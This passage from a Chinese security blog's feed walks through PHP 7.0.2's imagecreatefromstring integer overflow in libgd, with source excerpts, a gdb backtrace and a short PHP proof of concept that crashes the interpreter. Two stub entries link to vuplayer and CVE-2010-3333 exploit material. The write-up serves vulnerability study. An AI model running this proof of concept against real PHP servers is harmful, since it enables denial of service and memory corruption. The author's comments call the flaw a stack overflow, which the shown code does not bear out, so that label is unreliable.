class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecreatefromstring)</div><div class="line">&#123;</div><div class="line">         zval *data;</div><div class="line">         gdImagePtr im;</div><div class="line">         int imtype;</div><div class="line">         char sig[8];</div><div class="line"> </div><div class="line">         if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;data) == FAILURE) &#123;</div><div class="line">                   return;</div><div class="line">         &#125;</div><div class="line">         convert_to_string_ex(data);</div><div class="line">         if (Z_STRLEN_P(data) &lt; 8) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Empty string or invalid image&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         memcpy(sig, Z_STRVAL_P(data), 8);</div><div class="line">         imtype = _php_image_type(sig);</div><div class="line">         switch (imtype) &#123;</div><div class="line">                   case PHP_GDIMG_TYPE_JPG:</div><div class="line">#ifdef HAVE_GD_JPG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;JPEG&quot;, gdImageCreateFromJpegCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No JPEG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_PNG:</div><div class="line">#ifdef HAVE_GD_PNG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;PNG&quot;, gdImageCreateFromPngCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No PNG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_GIF:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GIF&quot;, gdImageCreateFromGifCtx);</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_WBM:</div><div class="line">                            im=_php_image_create_from_string(data,&quot;WBMP&quot;, gdImageCreateFromWBMPCtx);</div><div class="line">                            break；</div><div class="line">                   case PHP_GDIMG_TYPE_GD2:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GD2&quot;, gdImageCreateFromGd2Ctx);</div><div class="line">                            break;</div><div class="line">                   default:</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;Data is not in a recognized format&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         if (!im) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Couldn&apos;t create GD Image Stream out of Data&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         RETURN_RES(zend_register_resource(im, le_gd));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>有可能上面的代码长了点，但是只要找到关键函数就行了_php_image_create_from_string，在这个函数中的gdNewDynamicCtxEx这个函数才是关键点，跟踪进去就行了。在gd.c:2196行，假如你使用其他版本可能行号不一样，不过没事搜索函数就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">gdImagePtr _php_image_create_from_string(zval *data, char *tn, gdImagePtr (*ioctx_func_p)())</div><div class="line">&#123;</div><div class="line">         gdImagePtr im;</div><div class="line">         gdIOCtx *io_ctx;</div><div class="line">         io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data),Z_STRVAL_P(data), 0);  //这边的传入参数的长度为0x80000000  由于是int，所以这边整数溢出。</div><div class="line">………………………………………………………………………………</div><div class="line">gdNewDynamicCtxEx函数代码，行号就不说了。</div><div class="line">gdIOCtx * gdNewDynamicCtxEx (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dpIOCtx *ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         ctx = (dpIOCtx *) gdMalloc (sizeof (dpIOCtx));</div><div class="line">         dp = newDynamic(initialSize, data, freeOKFlag);</div><div class="line">         ctx-&gt;dp = dp; //这边将initialSize 赋值了</div><div class="line">         ctx-&gt;ctx.getC =dynamicGetchar; //这边造成栈溢出，跟踪进去进行了。</div><div class="line">………………………………………………………………………………</div><div class="line"></div><div class="line">newDynamic函数代码</div><div class="line">static dynamicPtr * newDynamic (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dp = (dynamicPtr *) gdMalloc (sizeof (dynamicPtr)); // 这边申请了64个字节</div><div class="line">         allocDynamic (dp, initialSize, data);</div><div class="line">………………………………………………………..</div><div class="line">static int</div><div class="line">allocDynamic (dynamicPtr * dp, int initialSize, void *data)</div><div class="line">&#123;</div><div class="line">         if (data == NULL) &#123;</div><div class="line">                   dp-&gt;logicalSize = 0;</div><div class="line">                   dp-&gt;dataGood = FALSE;</div><div class="line">                   dp-&gt;data = gdMalloc(initialSize);  这里的initialSize的值为-2147483648</div><div class="line">         &#125; else &#123;</div><div class="line">                   dp-&gt;logicalSize = initialSize;</div><div class="line">                   dp-&gt;dataGood = TRUE;</div><div class="line">                   dp-&gt;data = data;</div><div class="line">         &#125;</div><div class="line">……………………………………………….</div><div class="line">static int dynamicGetchar (gdIOCtxPtr ctx)</div><div class="line">&#123;</div><div class="line">         unsigned char b;</div><div class="line">         int rv;</div><div class="line">         rv = dynamicGetbuf (ctx, &amp;b, 1);</div><div class="line"> </div><div class="line">………………………………………………………………………………</div><div class="line">static int dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len)</div><div class="line">&#123;</div><div class="line">         int rlen, remain;</div><div class="line">         dpIOCtxPtr dctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dctx = (dpIOCtxPtr) ctx;</div><div class="line">         dp = dctx-&gt;dp;</div><div class="line">         remain = dp-&gt;logicalSize - dp-&gt;pos;</div><div class="line">         if (remain &gt;= len) &#123;</div><div class="line">                   rlen = len;</div><div class="line">         &#125; else &#123;</div><div class="line">                   if (remain == 0) &#123;</div><div class="line">                            return EOF;</div><div class="line">                   &#125;</div><div class="line">                   rlen = remain;//上面的remain 的值为负数，没有检查，直接比较后赋值，所以导致下面的rlen的值过大造成栈溢出。</div><div class="line">         &#125;</div><div class="line">         memcpy(buf, (void *) ((char *) dp-&gt;data + dp-&gt;pos), rlen); //这边造成了栈溢出</div></pre></td></tr></table></figure></p>
<p>下面是几个结构体，可以对照着去理解代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct gdIOCtx &#123;</div><div class="line">         int    (*getC)(struct gdIOCtx*);</div><div class="line">         int    (*getBuf)(struct gdIOCtx*, void*, int);</div><div class="line">         void  (*putC)(struct gdIOCtx*, int);</div><div class="line">         int    (*putBuf)(struct gdIOCtx*, const void*, int);</div><div class="line">         int    (*seek)(struct gdIOCtx*, const int);</div><div class="line">         long (*tell)(struct gdIOCtx*);</div><div class="line">         void  (*gd_free)(struct gdIOCtx*);</div><div class="line">         void  *data;</div><div class="line">&#125; gdIOCtx;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpStruct</div><div class="line">&#123;</div><div class="line">         void *data;</div><div class="line">         int logicalSize;</div><div class="line">         int realSize;</div><div class="line">         int dataGood;</div><div class="line">         int pos;</div><div class="line">         int freeOK;</div><div class="line">&#125; dynamicPtr;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpIOCtx</div><div class="line">&#123;</div><div class="line">         gdIOCtx ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">&#125; dpIOCtx;</div><div class="line">………………………………………………………………………………</div></pre></td></tr></table></figure></p>
<p>下面是gdb的调试信息,不知道为什么参数的值没有显示出来。有些代码直接阅读比较麻烦，可以gdb调试代码，再调试的同时，打印出它的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php</div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"> </div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">118  ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">#1  0x000000000059c1cf in memcpy (__len=18446744071562067968, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string3.h:51</div><div class="line">#2  dynamicGetbuf (ctx=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;) at /root/php-7.0.2/ext/gd/libgd/gd_io_dp.c:246</div><div class="line">#3  0x000000000059dd05 in php_gd_fill_input_buffer (cinfo=0x7fffffffaa70) at /root/php-7.0.2/ext/gd/libgd/gd_jpeg.c:607</div><div class="line">#4  0x00007ffff73144e6 in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div><div class="line">#5  0x00007ffff73129ca in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div></pre></td></tr></table></figure></p>
<p>poc就放下面了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;memory_limit&apos;,-1);</div><div class="line">$var_3  =  str_repeat(&quot;A&quot;,0x80000000);</div><div class="line">$var_3[0]=&quot;\xff&quot;;</div><div class="line">$var_3[1]=&quot;\xd8&quot;;</div><div class="line">$var_3[2]=&quot;\xff&quot;;</div><div class="line">imagecreatefromstring($var_3);</div></pre></td></tr></table></figure></p>
<p>这边为什么要替换变量的值呢，由于它上面会检查文件头是否为真实的图片。所以我这边用了jpg的文件头，应该是吧，我也忘了啥文件头，反正只要网上搜索一下图片的文件头就行了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>说实话我也是初学者，只能这样写一篇文章了，网上的php底层的漏洞挖掘太少了，就只有应用层的代码审计，希望能够给初学者们帮助吧。如果写的有啥不对的地方欢迎指出。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://bugs.php.net/bug.php?id=73280" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73280</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[vuplayer stack overflow]]></title>
      <url>http://yoursite.com/2016/10/11/vuplayer-stack-overflow/</url>
      <content type="html"><![CDATA[<p>一、漏洞环境<br>vuplayer2.49   win7 32</p>
<p>由于win7 没有找到绕过aslr的方法，但是dep绕过了。</p>
<p><a href="https://github.com/whiteHat001/vuplayer/" target="_blank" rel="external">下载地址</a><br>参考资料:<a href="https://www.exploit-db.com/exploits/40172/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40172/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[cve-2010-3333调试学习笔记]]></title>
      <url>http://yoursite.com/2016/09/23/cve-2010-3333%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>由于第一次分析，难免会有错误，希望能够指出。<br><a href="https://github.com/whiteHat001/cve-2010-3333" target="_blank" rel="external">下载地址</a><br>参考文档:《漏洞战争》</p>
]]></content>
    </entry>
    
  
  
</search>
